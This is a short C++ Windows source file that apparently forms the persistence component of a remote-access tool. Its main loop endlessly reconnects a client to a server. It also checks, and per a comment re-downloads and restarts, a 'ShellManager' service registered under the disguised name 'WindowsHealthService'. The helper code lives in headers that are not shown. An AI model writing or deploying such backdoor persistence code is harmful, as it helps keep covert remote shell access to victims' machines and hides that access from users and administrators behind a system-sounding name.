#include "general.h"
#include "serviceutils.h"

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	while (true)
	{
		if (!Client::main_client.connected)
		{
			while (!Client::main_client.Connect())
			{
				Sleep(5000);
			}
		}

		//Here maybe check if the ShellManager service is still active, and if it isn't download it if necessary and start it up again
		Service::CheckAndRepairService("WindowsHealthService", SERVICE_FILE_NAME);

		Sleep(1000);
	}

	return 0;
}